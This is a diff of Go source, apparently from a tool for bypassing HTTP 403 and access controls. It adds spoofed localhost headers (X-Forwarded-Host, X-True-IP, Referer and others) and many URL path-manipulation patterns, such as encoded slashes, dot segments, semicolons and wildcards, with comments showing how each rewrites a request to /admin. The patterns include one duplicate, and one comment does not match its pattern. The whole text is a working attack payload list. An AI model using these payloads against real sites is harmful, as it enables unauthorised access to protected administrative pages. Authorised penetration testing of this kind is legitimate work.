@@ -38,20 +38,33 @@ var BypassHeaders = []map[string][]string{
 	{"X-Remote-Addr": {"127.0.0.1"}},
 	{"X-Remote-Addr": {"localhost"}},
 	{"X-Remote-IP": {"127.0.0.1"}},
+	{"Redirect": {"127.0.0.1"}},
+	{"Referer": {"127.0.0.1"}},
+	{"X-Forwarded-Host": {"127.0.0.1"}},
+	{"X-Forwarded-Port": {"80"}},
+	{"X-True-IP": {"127.0.0.1"}},
 }
 
 var PathBypassPatterns = []string{
-	"%s/./%s",
-	"%s/../%s",
-	"%s/%%2e/%s",
-	"%s/%s/",
-	"%s/%s%%20/",
-	"%s/;/%s",
-	"%s/.;/%s",
-	"%s//;//%s",
-	"%s//%s//",
-	"%s/%s.json",
-	"%s/./%s/..",
+	"%s/./%s",      // https://example.com/./admin
+	"%s/../%s",     // https://example.com/../admin
+	"%s/%%2e/%s",   // https://example.com/%2e/admin
+	"%s/%s/",       // https://example.com/admin/
+	"%s/%s%%20/",   // https://example.com/admin%20/
+	"%s/;/%s",      // https://example.com/;/admin
+	"%s/.;/%s",     // https://example.com/.;/admin
+	"%s//;//%s",    // https://example.com//;//admin
+	"%s//%s//",     // https://example.com//admin//
+	"%s/%s.json",   // https://example.com/admin.json
+	"%s/./%s/..",   // https://example.com/./admin/..
+	"%s/*%s",       // https://example.com/*admin/
+	"%s/%s*",       // https://example.com/admin/*
+	"%s/%%2f%s",    // https://example.com/%2fadmin/
+	"%s%%2f%s%%2f", // https://example.com%2fadmin%2f
+	"%s//%s/./",    // https://example.com//admin/./
+	"%s///%s///",   // https://example.com///admin///
+	"%s/%s/;/",     // https://example.com/;/admin/
+	"%s//;//%s",    // https://example.com//;//admin/
 }
 
 var HttpMethods = [9]string{
